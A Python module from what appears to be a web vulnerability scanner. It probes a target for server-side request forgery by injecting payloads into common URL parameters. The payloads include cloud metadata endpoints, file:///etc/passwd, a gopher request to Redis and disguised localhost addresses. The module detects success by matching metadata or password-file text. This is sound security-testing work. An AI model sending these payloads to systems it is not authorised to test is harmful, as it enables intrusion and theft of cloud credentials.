import re
from modules.base import BaseModule


class SsrfModule(BaseModule):
    NAME = "ssrf"
    DESCRIPTION = "SSRF testing - internal service probing, cloud metadata"

    PAYLOADS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://169.254.169.254/latest/meta-data/",    # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/v1/",         # DigitalOcean
        "http://169.254.169.254/metadata/instance",    # Azure
        "file:///etc/passwd",
        "dict://127.0.0.1:22/",
        "ftp://127.0.0.1:21/",
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.1/",
        "http://0177.0.0.1/",
        "http://0x7f000001/",
    ]

    CLOUD_META_PATTERNS = [
        r"ami-id", r"instance-id", r"local-ipv4",  # AWS
        r"computeMetadata",                          # GCP
        r"USERDATA",                                 # Azure
    ]

    PARAMS = ["url", "file", "page", "source", "dest", "redirect",
              "return", "path", "continue", "img", "link", "href",
              "fetch", "load", "proxy", "target", "to", "from"]

    def run(self):
        self.log.info("[ssrf] Testing for SSRF vulnerabilities")
        for param in self.PARAMS:
            for payload in self.PAYLOADS:
                resp = self.get(self.target, params={param: payload})
                if self._is_ssrf(resp):
                    self.add_finding(
                        severity="CRITICAL",
                        title="Server-Side Request Forgery (SSRF)",
                        url=self.target,
                        detail=f"Parameter '{param}' fetched internal resource.",
                        payload=payload,
                        evidence=resp.text[:400] if resp else "",
                        remediation=(
                            "Allowlist permitted schemes and destinations. "
                            "Block requests to private IP ranges."
                        ),
                    )
                    return

    def _is_ssrf(self, resp) -> bool:
        if not resp or resp.status_code not in (200, 301, 302):
            return False
        return any(re.search(p, resp.text, re.I) for p in self.CLOUD_META_PATTERNS) or \
               "root:" in resp.text
